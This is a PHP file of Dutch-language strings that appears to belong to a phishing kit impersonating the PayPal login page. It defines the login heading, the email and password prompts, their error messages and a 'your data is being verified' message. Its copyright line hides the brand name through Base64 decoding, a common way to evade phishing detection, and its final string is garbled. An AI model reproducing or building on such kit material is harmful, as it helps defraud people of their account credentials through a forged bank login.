<?php
$Z118_01 = "Log in op uw PayPal-rekening";
$Z118_02 = "E-mailadres";
$Z118_03 = "Wachtwoord";
$Z118_04 = "E-mailadres is vereist.";
$Z118_05 = "Wachtwoord is vereist";
$Z118_06 = "Inloggen";
$Z118_07 = "Uw e-mailadres of wachtwoord vergeten?";
$Z118_08 = "Rekening openen";
$Z118_09 = "Privacy";
$Z118_10 = "PayPal";
$Z118_11 = "Copyright © 1999 - <script>document.write(new Date().getFullYear());</script> <script>document.write(Base64.decode('UGF5UGFs'));</script>. Alle rechten voorbehouden.";
$Z118_12 = "Uw gegevens worden gecontroleerd...";
$Z118_13 = "Uw informatie is deäÿil Bazaar ± doäÿr. Probeer het opnieuw.";
?>
